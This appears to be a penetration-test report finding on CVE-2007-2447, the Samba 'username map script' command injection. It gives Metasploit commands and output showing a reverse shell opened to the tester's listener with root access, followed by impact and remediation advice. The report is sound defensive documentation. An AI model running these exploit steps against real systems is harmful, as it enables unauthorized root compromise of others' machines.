# F-03 — Samba "username map script" Remote Command Execution → Root Access

## Severity
Critical

## CVSS
- **NVD-published score:** None — NVD has deferred enrichment of this CVE record and has not published a CVSS score of any version.
- **Self-assessed CVSS v3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
  *(Self-assessed, since no official NVD score exists. Reflects unauthenticated, network-exploitable remote code execution that, as demonstrated below, grants immediate root access.)*

## CVE
CVE-2007-2447

## Affected Service
Samba smbd 3.X (port 139/tcp, 445/tcp)

## CWE
CWE-78 — Improper Neutralization of Special Elements used in an OS Command

## Description
Older Samba versions support a `username map script` configuration option, used to map login names via an external script. The script's input is not properly sanitized, so an attacker can submit a username containing shell metacharacters to have arbitrary commands executed by the underlying shell. Metasploit's `exploit/multi/samba/usermap_script` module automates this.

## Validation (Proof of Concept)
```
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.102
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.101
msf6 exploit(multi/samba/usermap_script) > run
```

**Result:**
```
[*] Started reverse TCP handler on 192.168.56.101:4444
[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:35411)

whoami
root
id
uid=0(root) gid=0(root)
```

No privilege escalation was required — the Samba service on this target runs as root, so command execution via this vulnerability grants immediate, full root access.

## Impact
An unauthenticated, remote attacker can execute arbitrary commands as root with a single exploit attempt and no credentials, resulting in complete and immediate system compromise.

## Evidence
- evidence/samba-usermap-root.png

## Remediation
- Upgrade Samba to a version beyond 3.0.25rc3, where this issue is fixed
- Avoid running network-facing services such as Samba as root where possible; use dedicated, restricted service accounts
- Remove or disable the `username map script` option unless specifically required, and if required, ensure the mapping script sanitizes all input
- Restrict SMB service exposure to trusted networks only
